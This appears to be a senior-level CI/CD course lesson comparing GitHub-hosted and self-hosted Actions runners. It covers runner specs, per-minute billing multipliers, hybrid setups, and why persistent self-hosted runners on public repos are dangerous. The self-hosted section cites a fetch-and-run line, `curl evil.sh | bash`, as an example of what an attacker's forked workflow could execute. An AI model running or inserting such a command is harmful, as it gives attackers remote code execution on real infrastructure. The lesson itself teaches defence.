---
concepts:
- ci-cd-gha-runners
deepensInto: []
estMin: 16
lang: en
lessonType: topic
level: senior
order: 1
prereqs: []
slug: "01-hosted-vs-self-hosted"
sources:
- https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners
- https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners
- https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions
spiral: []
status: ready
title: "Hosted vs self-hosted runners: the spec, the bill, and the public-repo trap"
summary: "GitHub-hosted runners are 4 vCPU / 16 GB, billed per minute (~$0.008/min Linux at 1x), with larger runners costing a vCPU multiple. Self-hosted runners are free of compute minutes but cost you machines, maintenance, and — on public repos — a code-execution attack surface."
track: "ci-cd"
unit: "11-runners-and-scale"
---

import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
The invoice landed at $9,400 for one month of Actions minutes, and the finance lead wanted a name attached to it. The platform team pulled the usage report: 70% of the spend came from one nightly matrix that fanned out to 48 jobs, each on a `macos-latest` runner. macOS minutes bill at a 10x multiplier — every macOS minute costs as much as ten Linux minutes — and the matrix only needed macOS for two of its 48 legs. The other 46 were running Go unit tests that would have been identical on Linux. Moving those 46 legs to `ubuntu-latest` cut the macOS footprint by 96% and the monthly bill to under $1,100. The fix took twenty minutes; the lesson was that nobody had read the billing multipliers, so a one-line `runs-on` choice had been quietly costing five figures a year.
</Hook>

<Crux>Hosted runners trade money for zero maintenance; self-hosted trade maintenance for money — and a code-execution risk on public repos.</Crux>

<Explanation>

## What a hosted runner actually is

A GitHub-hosted runner is a fresh, ephemeral VM provisioned for a single job and destroyed afterward. The standard Linux and Windows runner is **4 vCPU, 16 GB RAM, 14 GB of SSD** — enough for most build-and-test work, tight for memory-hungry compilers or large Docker builds. macOS runners are larger (the standard tier is bigger because Apple silicon hosts are). The key properties: clean slate every run (no state leaks between jobs), preinstalled toolchains (the `runner-images` set updated weekly), and a hard **6-hour per-job** and **35-day per-workflow** ceiling.

Billing is **per minute, rounded up**, with an OS multiplier:

- **Linux: 1x** — roughly **$0.008/min** on the standard runner.
- **Windows: 2x** — same minute counts twice.
- **macOS: 10x** — same minute counts ten times.

Larger runners (8, 16, 32, 64 vCPU) bill at a multiple of the base per-vCPU rate and are **not** included in the free monthly minutes — only standard runners draw from the included allowance (2,000 min/month on the Free plan for private repos; public repos are free on standard runners). The multiplier math is the single biggest lever on the bill: a job that does not need macOS or Windows should never `runs-on` them.

<Quiz
  id="01-hosted-vs-self-hosted-quiz-1"
  lessonSlug="01-hosted-vs-self-hosted"
  lang="en"
  question="A test job takes 5 minutes of wall-clock time. The same job is run on ubuntu-latest, windows-latest, and macos-latest. How many billed minutes does each consume, and which costs the most?"
  choices={[
    { label: "Linux 5, Windows 10, macOS 50 — macOS costs the most because it bills at a 10x multiplier", correct: true },
    { label: "5 minutes each — the OS does not change billing, only the runner size does", misconception: "Runner size does add a multiple, but OS already carries its own multiplier independent of size: Linux 1x, Windows 2x, macOS 10x. Five wall-clock minutes is 5 billed on Linux, 10 on Windows, 50 on macOS." },
    { label: "Linux 5, Windows 5, macOS 5, but macOS machines are faster so the job finishes sooner", correct: false, misconception: "Hardware speed does not change the per-minute multiplier. macOS bills 10x per minute regardless of how fast the job runs, so identical wall-clock time costs ten times more on macOS." },
    { label: "Linux 10, Windows 5, macOS 5 — Linux is the premium tier", correct: false, misconception: "Linux is the cheapest at 1x, not a premium. The order is reversed: Linux 1x, Windows 2x, macOS 10x, so Linux is always the cheapest for the same wall-clock minutes." },
  ]}
/>

## Self-hosted: free minutes, real costs, real risk

A self-hosted runner is a machine *you* register with GitHub via the runner agent. GitHub charges **no compute minutes** for it — the trade is that you now own the box: provisioning, OS patching, disk cleanup between runs, security hardening, and capacity. Self-hosted wins when you need hardware hosted runners do not offer (GPUs, ARM at scale, huge RAM, on-prem network access to private artifact registries or databases), or when sustained 24/7 build volume makes always-on owned hardware cheaper than per-minute hosted minutes.

The trap that ends careers: **never attach a self-hosted runner to a public repository.** A pull request from a fork runs the workflow it ships — including a workflow that the attacker rewrote to run `curl evil.sh | bash` on your runner. On a hosted runner that is a throwaway VM; on a *persistent* self-hosted runner inside your network, it is remote code execution against your infrastructure with whatever credentials that machine holds. GitHub's own docs warn against it in bold. If you must run untrusted code, use **ephemeral** runners (registered with `--ephemeral`, torn down after one job) and isolate them in a network that can reach nothing valuable.

<Inset kind="why" lang="en">
Why is ephemeral the dividing line for safety? A persistent runner accumulates state — a poisoned cache, a leftover credential in the environment, a backdoor written to disk by job N — that job N+1 inherits. Ephemeral runners are provisioned fresh and destroyed after a single job, so a compromised job cannot persist anything into the next one. It is the same property that makes hosted runners safe by default: one job, one VM, then gone. Self-hosted only approaches that safety when you rebuild the runner per job.
</Inset>

## Picking the boundary

The decision is rarely all-or-nothing. Most mature setups are hybrid: hosted runners for the default trusted path (PRs from collaborators, main-branch builds) and a self-hosted pool only for the jobs that genuinely need special hardware or network reach. The cost calculus: hosted is cheaper until your steady-state concurrent demand is high enough that always-on owned capacity beats per-minute billing — and even then you inherit the operational burden of keeping that pool patched, sized, and secure. Start hosted; move specific jobs to self-hosted when a concrete need (cost at scale, hardware, network) justifies the maintenance you are signing up for.

<Quiz
  id="01-hosted-vs-self-hosted-quiz-2"
  lessonSlug="01-hosted-vs-self-hosted"
  lang="en"
  question="Why is attaching a persistent self-hosted runner to a public repository considered a critical security mistake?"
  choices={[
    { label: "A fork's pull request can modify the workflow to run arbitrary code on your runner, and a persistent runner gives that code your network access and any leftover state", correct: true },
    { label: "Public repos are billed at a higher multiplier, so self-hosted runners cost more there", correct: false, misconception: "Self-hosted runners are not billed compute minutes at all, on public or private repos. The danger is not cost — it is that untrusted fork code executes on a machine inside your network." },
    { label: "GitHub blocks self-hosted runners on public repos entirely, so it simply will not work", correct: false, misconception: "GitHub does not block it — it warns against it. The platform lets you do it; the risk is that you have opened your infrastructure to arbitrary code from any fork's pull request." },
    { label: "Public repos cannot use caching, so self-hosted runners there are pointlessly slow", correct: false, misconception: "Public repos can use caching. The issue is security, not cache availability: a fork PR can run attacker-controlled code on a persistent in-network runner." },
  ]}
/>

</Explanation>

<FlowDiagram
  label="A queued job is routed to a hosted ephemeral VM or matched to a self-hosted pool by label, with cost and risk diverging at the fork"
  hue="var(--d-infra)"
  perRow={3}
  nodes={[
    { id: "queue", label: "Job queued", sub: "runs-on label" },
    { id: "route", label: "Runner match", sub: "label + availability" },
    { id: "hosted", label: "Hosted VM", sub: "fresh, ephemeral" },
    { id: "selfhosted", label: "Self-hosted pool", sub: "your machines" },
    { id: "bill", label: "Per-minute bill", sub: "1x / 2x / 10x" },
    { id: "fork", label: "Fork PR risk", sub: "use ephemeral only" },
  ]}
  edges={[
    { from: "queue", to: "route", label: "dispatch" },
    { from: "route", to: "hosted", label: "ubuntu/macos" },
    { from: "route", to: "selfhosted", label: "custom label" },
    { from: "hosted", to: "bill", label: "OS multiplier" },
    { from: "selfhosted", to: "fork", label: "untrusted code" },
  ]}
  caption="Hosted runners bill per minute with an OS multiplier and are safe by default because each VM is thrown away. Self-hosted runners cost no minutes but inherit maintenance and, on public repos, a remote-code-execution surface unless every runner is ephemeral."
/>

<KeyTakeaway>Hosted runners are 4 vCPU / 16 GB ephemeral VMs billed per minute with an OS multiplier — Linux 1x (~$0.008/min), Windows 2x, macOS 10x — and larger runners cost a vCPU multiple outside the free allowance, so the cheapest reliable lever on your CI bill is picking the smallest OS that works. Self-hosted runners cost no compute minutes but make you the operator, and on public repos a persistent runner is a remote-code-execution target for any fork's pull request — only ephemeral, network-isolated runners are safe for untrusted code.</KeyTakeaway>

<RetrievalDrawer
  client:visible
  id="01-hosted-vs-self-hosted-retrieval"
  lang="en"
  questions={[
    { q: "State the hosted-runner spec and the per-OS billing multipliers, and explain why the OS choice is the biggest cost lever.", a: "The standard GitHub-hosted Linux/Windows runner is 4 vCPU, 16 GB RAM, 14 GB SSD, an ephemeral VM billed per minute rounded up at roughly $0.008/min on Linux. The multipliers are Linux 1x, Windows 2x, macOS 10x: the same five wall-clock minutes bill as 5, 10, or 50. Larger runners (8–64 vCPU) bill a further vCPU multiple and are excluded from the included free minutes. Because the multiplier compounds across every job and every run, picking the smallest OS that works — Linux unless the build genuinely needs Windows or macOS — is the single change with the largest, most reliable effect on the monthly bill, far more than micro-optimizing job duration." },
    { q: "Why must self-hosted runners on public repos be ephemeral, and what is the failure mode otherwise?", a: "A workflow triggered by a fork's pull request runs the workflow definition as it exists in that fork, so an attacker can rewrite it to execute arbitrary commands on whatever runner picks it up. On a persistent self-hosted runner inside your network that is remote code execution with the runner's credentials and network reach, plus the ability to leave behind poisoned caches, backdoors, or leaked secrets that the next job inherits. Ephemeral runners (registered with --ephemeral and destroyed after one job) remove the persistence: each job gets a fresh box that is torn down, so a compromised run cannot carry state forward — the same one-job-one-VM property that makes hosted runners safe by default. The rule of thumb is simply: never attach a persistent self-hosted runner to a public repo." },
  ]}
/>

<Recap lang="en">
A GitHub-hosted runner is a throwaway VM — 4 vCPU, 16 GB RAM, 14 GB SSD on the standard tier — provisioned fresh per job, preloaded with weekly-updated toolchains, capped at 6 hours per job. You pay per minute rounded up, and the OS multiplier dominates the bill: Linux 1x at roughly $0.008/min, Windows 2x, macOS 10x, with larger 8–64 vCPU runners adding a further multiple and falling outside the included free minutes. The cheapest, most reliable cost lever is therefore the `runs-on` line: run on the smallest OS that works, and reserve Windows and macOS for the legs of a matrix that truly require them. Self-hosted runners flip the trade — GitHub bills no compute minutes, but you now own provisioning, patching, cleanup, sizing, and security, and they only pay off when you need hardware hosted runners lack or when sustained concurrent volume makes always-on owned capacity cheaper than per-minute hosted minutes. The hard rule is security: a persistent self-hosted runner on a public repository is a remote-code-execution target, because a fork's pull request runs the workflow it ships and can execute attacker commands on a machine inside your network with leftover state for the next job to inherit. If untrusted code must run, use ephemeral runners — fresh per job, destroyed after — isolated in a network that reaches nothing valuable. Most mature setups stay hybrid: hosted for the trusted default path, a small self-hosted pool only where a concrete hardware, network, or scale need justifies the maintenance.
</Recap>
